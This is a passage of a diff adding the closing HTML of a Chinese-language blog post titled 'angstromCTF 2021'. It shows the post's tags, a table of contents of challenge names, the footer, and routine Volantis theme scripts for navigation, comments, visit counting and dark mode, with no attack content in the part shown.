+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-04-08T21:01:17+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Apr 8, 2021</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/CTF/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>CTF</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/WEB/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>WEB</p></a></div>
+
+
+        
+      
+    </div>
+  </div>
+
+
+  
+  
+
+  
+    <div class="prev-next">
+      
+      
+        <a class='next' href='/2021/03/06/D%5E3CTF-8-bit-pub/'>
+          <p class='title'>D^3CTF 8-bit-pub<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>周末进行的d^3CTF原本自己是没参加的。不过因为被问到了其中一道题目所以就做了下, 大概花了2个小时。题目难度虽然中等，不过个人认为其利用链的组成都是比较经典的漏洞。这里分享下自己的做题思路
+...</p>
+        </a>
+      
+    </div>
+  
+</article>
+
+
+  
+
+  <article class="post white-box reveal shadow" id="comments">
+    <p ct><i class='fas fa-comments'></i> 评论</p>
+    
+    <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+</div>
+
+  </article>
+
+
+
+
+
+
+</div>
+<aside class='l_side'>
+  
+  
+    
+    
+
+
+
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Sea-of-Quills"><span class="toc-text">Sea of Quills</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sea-of-Quills2"><span class="toc-text">Sea of Quills2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jar"><span class="toc-text">Jar</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nomnomnom"><span class="toc-text">nomnomnom</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reaction-py"><span class="toc-text">Reaction . py</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jason"><span class="toc-text">jason</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Spoofy"><span class="toc-text">Spoofy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Watered-Down-Watermark-as-a-Service"><span class="toc-text">Watered Down Watermark as a Service</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Summary"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-text">References</span></a></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+
+		  
+		  <!--此文件用来存放一些不方便取值的变量-->
+<!--思路大概是将值藏到重加载的区域内-->
+
+<script>
+  window.pdata={}
+  pdata.ispage=true;
+  pdata.postTitle="angstromCTF 2021";
+  pdata.commentPath="";
+  pdata.commentPlaceholder="";
+  // header 这里无论是否开启pjax都需要
+  var l_header=document.getElementById("l_header");
+  
+  l_header.classList.remove("show");
+  
+  
+    // cover
+    var cover_wrapper=document.querySelector('.cover-wrapper');
+    
+    cover_wrapper.id="half";
+    cover_wrapper.style.display="";
+    
+  
+</script>
+
+        </div>
+        
+  
+  <footer class="footer clearfix">
+    <br><br>
+    
+      
+        <div class="aplayer-container">
+          
+
+
+        </div>
+      
+    
+      
+        <br>
+        <div class="social-wrapper">
+          
+            
+              <a href="/atom.xml"
+                class="social fas fa-rss flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+                
+              </a>
+            
+          
+            
+              <a href="mailto:895531613@qq.com"
+                class="social fas fa-envelope flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+                
+              </a>
+            
+          
+            
+              <a href="https://github.com/baiyecha404"
+                class="social fab fa-github flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+                
+              </a>
+            
+          
+        </div>
+      
+    
+      
+        <div><p>博客内容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+</div>
+      
+    
+      
+        
+          <div><p><span id="lc-sv">本站总访问量为 <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span> 次</span> <span id="lc-uv">访客数为 <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span> 人</span></p>
+</div>
+        
+      
+    
+      
+        本站使用
+        <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
+        作为主题
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="bycsec.top">Copyright © 2020 byc_404</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+
+        <a id="s-top" class="fas fa-arrow-up fa-fw" href="javascript:void(0)"></a>
+      </div>
+    </div>
+    <div>
+      <script>
+/************这个文件存放不需要重载的全局变量和全局函数*********/
+window.volantis={};
+window.volantis.loadcss=document.getElementById("loadcss");
+/******************** Pjax ********************************/
+function VPjax(){
+	this.list=[] // 存放回调函数
+	this.start=()=>{
+	  for(var i=0;i<this.list.length;i++){
+		this.list[i].run();
+	  }
+	}
+	this.push=(fn,name)=>{
+		var f=new PjaxItem(fn,name);
+		this.list.push(f);
+	}
+	// 构造一个可以run的对象
+	function PjaxItem(fn,name){
+		// 函数名称
+		this.name = name || fn.name
+		// run方法
+		this.run=()=>{
+			fn()
+		}
+	}
+}
+volantis.pjax={}
+volantis.pjax.method={
+	complete: new VPjax(),
+	error: new VPjax(),
+	send: new VPjax()
+}
+volantis.pjax={
+	...volantis.pjax,
+	push: volantis.pjax.method.complete.push,
+	error: volantis.pjax.method.error.push,
+	send: volantis.pjax.method.send.push
+}
+/********************脚本懒加载函数********************************/
+// 已经加入了setTimeout
+function loadScript(src, cb) {
+	setTimeout(function() {
+		var HEAD = document.getElementsByTagName('head')[0] || document.documentElement;
+		var script = document.createElement('script');
+		script.setAttribute('type','text/javascript');
+		if (cb) script.onload = cb;
+		script.setAttribute('src', src);
+		HEAD.appendChild(script);
+	});
+}
+//https://github.com/filamentgroup/loadCSS
+var loadCSS = function( href, before, media, attributes ){
+	var doc = window.document;
+	var ss = doc.createElement( "link" );
+	var ref;
+	if( before ){
+		ref = before;
+	}
+	else {
+		var refs = ( doc.body || doc.getElementsByTagName( "head" )[ 0 ] ).childNodes;
+		ref = refs[ refs.length - 1];
+	}
+	var sheets = doc.styleSheets;
+	if( attributes ){
+		for( var attributeName in attributes ){
+			if( attributes.hasOwnProperty( attributeName ) ){
+				ss.setAttribute( attributeName, attributes[attributeName] );
+			}
+		}
+	}
+	ss.rel = "stylesheet";
+	ss.href = href;
+	ss.media = "only x";
+	function ready( cb ){
+		if( doc.body ){
+			return cb();
+		}
+		setTimeout(function(){
+			ready( cb );
+		});
+	}
+	ready( function(){
+		ref.parentNode.insertBefore( ss, ( before ? ref : ref.nextSibling ) );
+	});
+	var onloadcssdefined = function( cb ){
+		var resolvedHref = ss.href;
+		var i = sheets.length;
+		while( i-- ){
+			if( sheets[ i ].href === resolvedHref ){
+				return cb();
+			}
+		}
+		setTimeout(function() {
+			onloadcssdefined( cb );
+		});
+	};
+	function loadCB(){
+		if( ss.addEventListener ){
+			ss.removeEventListener( "load", loadCB );
+		}
+		ss.media = media || "all";
+	}
+	if( ss.addEventListener ){
+		ss.addEventListener( "load", loadCB);
+	}
+	ss.onloadcssdefined = onloadcssdefined;
+	onloadcssdefined( loadCB );
+	return ss;
+};
+</script>
+<script>
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14/css/all.min.css", window.volantis.loadcss);
+  
+  
+  
+  
+</script>
+<!-- required -->
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5/dist/jquery.min.js"></script>
+
+<script>
+  function pjax_fancybox() {
+    $(".md .gallery").find("img").each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("class", "fancybox");
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".md .gallery").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  function SCload_fancybox() {
+    if ($(".md .gallery").find("img").length == 0) return;
+    loadCSS("https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css", document.getElementById("loadcss"));
+    loadScript('https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js', pjax_fancybox)
+  };
+  $(function () {
+    SCload_fancybox();
+  });
+  function Pjax_SCload_fancybox(){
+	if (typeof $.fancybox == "undefined") {
+	 SCload_fancybox();
+    } else {
+	 pjax_fancybox();
+    }
+  }
+  volantis.pjax.push(Pjax_SCload_fancybox)
+  volantis.pjax.send(()=>{
+      if (typeof $.fancybox != "undefined") {
+        $.fancybox.close();    // 关闭弹窗
+      }
+  },'fancybox')
+</script>
+
+
+<!-- internal -->
+
+  
+  
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js"></script>
+
+    <script type="text/javascript">
+        var imgs=["https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/001.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/002.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/003.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/004.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/005.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/006.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/012.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/016.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/019.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/033.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/034.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/035.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/038.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/039.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/042.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/046.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/051.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/052.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/054.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/056.jpg"];
+        if ('true' == 'true') {
+          function shuffle(arr){
+            /*From countercurrent-time*/
+            var n = arr.length;
+            while(n--) {
+              var index = Math.floor(Math.random() * n);
+              var temp = arr[index];
+              arr[index] = arr[n];
+              arr[n] = temp;
+            }
+          }
+          shuffle(imgs);
+        }
+	  function Pjax_backstretch(){
+        
+          $.backstretch(
+            imgs,
+          {
+            duration: "10000",
+            fade: "1500"
+          });
+        
+	  }
+	  loadScript("https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js",Pjax_backstretch)
+    </script>
+  
+
+
+
+
+<script>
+  function loadIssuesJS() {
+    if ($(".md").find(".issues-api").length == 0) return;
+	
+	  loadScript('/js/issues.js');
+	
+  };
+  $(function () {
+    loadIssuesJS();
+  });
+  volantis.pjax.push(()=>{
+	if (typeof IssuesAPI == "undefined") {
+	  loadIssuesJS();
+	}
+  },"IssuesJS")
+</script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazyload",
+    threshold: 0
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    lazyLoadInstance.update();
+  });
+  document.addEventListener('pjax:complete', function () {
+    lazyLoadInstance.update();
+  });
+</script>
+
+
+
+
+  
+
+<script>
+  window.FPConfig = {
+	delay: 0,
+	ignoreKeywords: [],
+	maxRPS: 5,
+	hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+<script src="/js/valine.js"></script>
+
+
+<script>
+  function emoji(path, idx, ext) {
+    return path + "/" + path + "-" + idx + "." + ext;
+  }
+  var emojiMaps = {};
+  for (var i = 1; i <= 54; i++) {
+    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+  }
+  for (var i = 1; i <= 101; i++) {
+    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+  }
+  for (var i = 1; i <= 116; i++) {
+    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+  }
+  for (var i = 1; i <= 125; i++) {
+    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+  }
+  for (var i = 1; i <= 4; i++) {
+    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+  }
+  function pjax_valine() {
+    if(!document.querySelectorAll("#valine_container")[0])return;
+    let pagePlaceholder = pdata.commentPlaceholder || "快来评论吧~";
+    let path = pdata.commentPath;
+    if (path.length == 0) {
+      let defaultPath = '';
+      path = defaultPath || decodeURI(window.location.pathname);
+    }
+    var valine = new Valine();
+    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
+      el: '#valine_container',
+      path: path,
+      placeholder: pagePlaceholder,
+      emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+      emojiMaps: emojiMaps,
+    }))
+  }
+  $(function () {
+    pjax_valine();
+  });
+  volantis.pjax.push(pjax_valine);
+</script>
+
+
+
+
+
+
+  
+<script src="/js/app.js"></script>
+
+
+
+<!-- optional -->
+
+  <script>
+const SearchServiceimagePath="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@master/img/";
+const ROOT =  ("/" || "/").endsWith('/') ? ("/" || "/") : ("//" || "/" );
+
+$('.input.u-search-input').one('focus',function(){
+	
+		loadScript('https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2.6.5/js/search.js',setSearchService);
+	
+})
+
+function listenSearch(){
+  
+    customSearch = new HexoSearch({
+      imagePath: SearchServiceimagePath
+    });
+  
+}
+function setSearchService() {
+	listenSearch();
+	
+}
+</script>
+
+
+
+
+
+
+
+
+
+
+
+  <script defer>
+
+  const LCCounter = {
+    app_id: 'pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz',
+    app_key: '9HlyBGu0qm9EmkSNKD2qoBx4',
+    custom_api_server: '',
+
+    // 查询存储的记录
+    getRecord(Counter, url, title) {
+      return new Promise(function (resolve, reject) {
+        Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({url})))
+          .then(resp => resp.json())
+          .then(({results, code, error}) => {
+            if (code === 401) {
+              throw error;
+            }
+            if (results && results.length > 0) {
+              var record = results[0];
+              resolve(record);
+            } else {
+              Counter('post', '/classes/Counter', {url, title: title, times: 0})
+                .then(resp => resp.json())
+                .then((record, error) => {
+                  if (error) {
+                    throw error;
+                  }
+                  resolve(record);
+                }).catch(error => {
+                console.error('Failed to create', error);
+                reject(error);
+              });
+            }
+          }).catch((error) => {
+          console.error('LeanCloud Counter Error:', error);
+          reject(error);
+        });
+      })
+    },
+
+    // 发起自增请求
+    increment(Counter, incrArr) {
+      return new Promise(function (resolve, reject) {
+        Counter('post', '/batch', {
+          "requests": incrArr
+        }).then((res) => {
+          res = res.json();
+          if (res.error) {
+            throw res.error;
+          }
+          resolve(res);
+        }).catch((error) => {
+          console.error('Failed to save visitor count', error);
+          reject(error);
+        });
+      });
+    },
+
+    // 构建自增请求体
+    buildIncrement(objectId) {
+      return {
+        "method": "PUT",
+        "path": `/1.1/classes/Counter/${ objectId }`,
+        "body": {
+          "times": {
+            '__op': 'Increment',
+            'amount': 1
+          }
+        }
+      }
+    },
+
+    // 校验是否为有效的 UV
+    validUV() {
+      var key = 'LeanCloudUVTimestamp';
+      var flag = localStorage.getItem(key);
+      if (flag) {
+        // 距离标记小于 24 小时则不计为 UV
+        if (new Date().getTime() - parseInt(flag) <= 86400000) {
+          return false;
+        }
+      }
+      localStorage.setItem(key, new Date().getTime().toString());
+      return true;
+    },
+
+    addCount(Counter) {
+      var enableIncr = '' === 'true' && window.location.hostname !== 'localhost';
+      enableIncr = true;
+      var getterArr = [];
+      var incrArr = [];
+      // 请求 PV 并自增
+      var pvCtn = document.querySelector('#lc-sv');
+      if (pvCtn || enableIncr) {
+        var pvGetter = this.getRecord(Counter, 'https://www.bycsec.top' + '/#lc-sv', 'Visits').then((record) => {
+          incrArr.push(this.buildIncrement(record.objectId))
+          var eles = document.querySelectorAll('#lc-sv #number');
+          if (eles.length > 0) {
+            eles.forEach((el,index,array)=>{
+              el.innerText = record.times + 1;
+              if (pvCtn) {
+                pvCtn.style.display = 'inline';
+              }
+            })
+          }
+        });
+        getterArr.push(pvGetter);
+      }
+
+      // 请求 UV 并自增
+      var uvCtn = document.querySelector('#lc-uv');
+      if (uvCtn || enableIncr) {
+        var uvGetter = this.getRecord(Counter, 'https://www.bycsec.top' + '/#lc-uv', 'Visitors').then((record) => {
+          var vuv = this.validUV();
+          vuv && incrArr.push(this.buildIncrement(record.objectId))
+          var eles = document.querySelectorAll('#lc-uv #number');
+          if (eles.length > 0) {
+            eles.forEach((el,index,array)=>{
+              el.innerText = record.times + (vuv ? 1 : 0);
+              if (uvCtn) {
+                uvCtn.style.display = 'inline';
+              }
+            })
+          }
+        });
+        getterArr.push(uvGetter);
+      }
+
+      // 请求文章的浏览数，如果是当前页面就自增
+      var allPV = document.querySelectorAll('#lc-pv');
+      if (allPV.length > 0 || enableIncr) {
+        for (i = 0; i < allPV.length; i++) {
+          let pv = allPV[i];
+          let title = pv.getAttribute('data-title');
+          var url = 'https://www.bycsec.top' + pv.getAttribute('data-path');
+          if (url) {
+            var viewGetter = this.getRecord(Counter, url, title).then((record) => {
+              // 是当前页面就自增
+              let curPath = window.location.pathname;
+              if (curPath.includes('index.html')) {
+                curPath = curPath.substring(0, curPath.lastIndexOf('index.html'));
+              }
+              if (pv.getAttribute('data-path') == curPath) {
+                incrArr.push(this.buildIncrement(record.objectId));
+              }
+              if (pv) {
+                var ele = pv.querySelector('#lc-pv #number');
+                if (ele) {
+                  if (pv.getAttribute('data-path') == curPath) {
+                    ele.innerText = (record.times || 0) + 1;
+                  } else {
+                    ele.innerText = record.times || 0;
+                  }
+                  pv.style.display = 'inline';
+                }
+              }
+            });
+            getterArr.push(viewGetter);
+          }
+        }
+      }
+
+      // 如果启动计数自增，批量发起自增请求
+      if (enableIncr) {
+        Promise.all(getterArr).then(() => {
+          incrArr.length > 0 && this.increment(Counter, incrArr);
+        })
+      }
+
+    },
+
+
+    fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${ api_server }/1.1${ url }`, {
+          method,
+          headers: {
+            'X-LC-Id': this.app_id,
+            'X-LC-Key': this.app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      this.addCount(Counter);
+    },
+
+    refreshCounter() {
+      var api_server = this.app_id.slice(-9) !== '-MdYXbMMI' ? this.custom_api_server : `https://${ this.app_id.slice(0, 8).toLowerCase() }.api.lncldglobal.com`;
+      if (api_server) {
+        this.fetchData(api_server);
+      } else {
+        fetch('https://app-router.leancloud.cn/2/route?appId=' + this.app_id)
+          .then(resp => resp.json())
+          .then(({api_server}) => {
+            this.fetchData('https://' + api_server);
+          });
+      }
+    }
+
+  };
+
+  LCCounter.refreshCounter();
+
+  document.addEventListener('pjax:complete', function () {
+    LCCounter.refreshCounter();
+  });
+</script>
+
+
+
+
+  <script>
+const rootElement = document.documentElement;
+const darkModeStorageKey = "user-color-scheme";
+const rootElementDarkModeAttributeName = "data-user-color-scheme";
+
+const setLS = (k, v) => {
+    localStorage.setItem(k, v);
+};
+
+const removeLS = (k) => {
+    localStorage.removeItem(k);
+};
+
+const getLS = (k) => {
+    return localStorage.getItem(k);
+};
+
+const getModeFromCSSMediaQuery = () => {
+  return window.matchMedia("(prefers-color-scheme: dark)").matches
+    ? "dark"
+    : "light";
+};
+
+const resetRootDarkModeAttributeAndLS = () => {
+  rootElement.removeAttribute(rootElementDarkModeAttributeName);
+  removeLS(darkModeStorageKey);
+};
+
+const validColorModeKeys = {
+  dark: true,
+  light: true,
+};
+
+const applyCustomDarkModeSettings = (mode) => {
+  const currentSetting = mode || getLS(darkModeStorageKey);
+
+  if (currentSetting === getModeFromCSSMediaQuery()) {
+    resetRootDarkModeAttributeAndLS();
+  } else if (validColorModeKeys[currentSetting]) {
+    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);
+  } else {
+    resetRootDarkModeAttributeAndLS();
+  }
+};
+
+const invertDarkModeObj = {
+  dark: "light",
+  light: "dark",
+};
+
+/**
+ * get target mode
+ */
+const toggleCustomDarkMode = () => {
+  let currentSetting = getLS(darkModeStorageKey);
+
+  if (validColorModeKeys[currentSetting]) {
+    currentSetting = invertDarkModeObj[currentSetting];
+  } else if (currentSetting === null) {
+    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];
+  } else {
+    return;
+  }
+  setLS(darkModeStorageKey, currentSetting);
+  return currentSetting;
+};
+
+/**
+ * bind click event for toggle button
+ */
+var btn=$("#wrapper .toggle-mode-btn,#rightmenu-wrapper .toggle-mode-btn");
+function bindToggleButton() {
+    btn.on('click',(e) => {
+      const mode = toggleCustomDarkMode();
+      applyCustomDarkModeSettings(mode);
+    });
+}
+
+applyCustomDarkModeSettings();
+document.addEventListener("DOMContentLoaded", bindToggleButton);
+volantis.pjax.push(bindToggleButton);
+volantis.pjax.send(()=>{
+	btn.unbind('click');
+},'toggle-mode-btn-unbind');
+</script>
+
+
+
+
+
+
+
+
+<script>
+function listennSidebarTOC() {
+  const navItems = document.querySelectorAll(".toc li");
+  if (!navItems.length) return;
+  const sections = [...navItems].map((element) => {
+    const link = element.querySelector(".toc-link");
+    const target = document.getElementById(
+      decodeURI(link.getAttribute("href")).replace("#", "")
+    );
+    link.addEventListener("click", (event) => {
+      event.preventDefault();
+      window.scrollTo({
+		top: target.offsetTop + 100,
+		
+		behavior: "smooth"
+		
+	  });
+    });
+    return target;
+  });
+
+  function activateNavByIndex(target) {
+    if (target.classList.contains("active-current")) return;
+
+    document.querySelectorAll(".toc .active").forEach((element) => {
+      element.classList.remove("active", "active-current");
+    });
+    target.classList.add("active", "active-current");
+    let parent = target.parentNode;
+    while (!parent.matches(".toc")) {
+      if (parent.matches("li")) parent.classList.add("active");
+      parent = parent.parentNode;
+    }
+  }
+
+  function findIndex(entries) {
+    let index = 0;
+    let entry = entries[index];
+    if (entry.boundingClientRect.top > 0) {
+      index = sections.indexOf(entry.target);
+      return index === 0 ? 0 : index - 1;
+    }
+    for (; index < entries.length; index++) {
+      if (entries[index].boundingClientRect.top <= 0) {
+        entry = entries[index];
+      } else {
+        return sections.indexOf(entry.target);
+      }
+    }
+    return sections.indexOf(entry.target);
+  }
+
+  function createIntersectionObserver(marginTop) {
+    marginTop = Math.floor(marginTop + 10000);
+    let intersectionObserver = new IntersectionObserver(
+      (entries, observe) => {
+        let scrollHeight = document.documentElement.scrollHeight + 100;
+        if (scrollHeight > marginTop) {
+          observe.disconnect();
+          createIntersectionObserver(scrollHeight);
+          return;
+        }
+        let index = findIndex(entries);
+        activateNavByIndex(navItems[index]);
+      },
+      {
+        rootMargin: marginTop + "px 0px -100% 0px",
+        threshold: 0,
+      }
+    );
+    sections.forEach((element) => {
+      element && intersectionObserver.observe(element);
+    });
+  }
+  createIntersectionObserver(document.documentElement.scrollHeight);
+}
+
+document.addEventListener("DOMContentLoaded", listennSidebarTOC);
+document.addEventListener("pjax:success", listennSidebarTOC);
+</script>
+
+<!-- more -->
+
+ 
+	   
+	    
+
+
+<script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script>
+
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
+        selectors: [
+          "title",
+          
+          "#pjax-container",
+          "#pjax-header-nav-list"
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      //window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      window.subData = null; // 移除标题（用于一二级导航栏切换处）
+
+      volantis.$switcher.removeClass('active'); // 关闭移动端激活的搜索框
+      volantis.$header.removeClass('z_search-open'); // 关闭移动端激活的搜索框
+      volantis.$wrapper.removeClass('sub'); // 跳转页面时关闭二级导航
+
+      // 解绑事件 避免重复监听
+      volantis.$topBtn.unbind('click');
+      $('.menu a').unbind('click');
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+	  // 使用 volantis.pjax.send 方法传入pjax:send回调函数 参见layout/_partial/scripts/global.ejs
+	  volantis.pjax.method.send.start();
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
+      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+      try{
+		// 使用 volantis.pjax.push 方法传入重载函数 参见layout/_partial/scripts/global.ejs
+		volantis.pjax.method.complete.start();
+      } catch (e) {
+        console.log(e);
+      }
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+	  // 使用 volantis.pjax.error 方法传入pjax:error回调函数 参见layout/_partial/scripts/global.ejs
+	  volantis.pjax.method.error.start();
+      window.location.href = e.triggerElement.href;
+    });
+</script>
+ 
+	  
+    </div>
+  </body>
+</html>
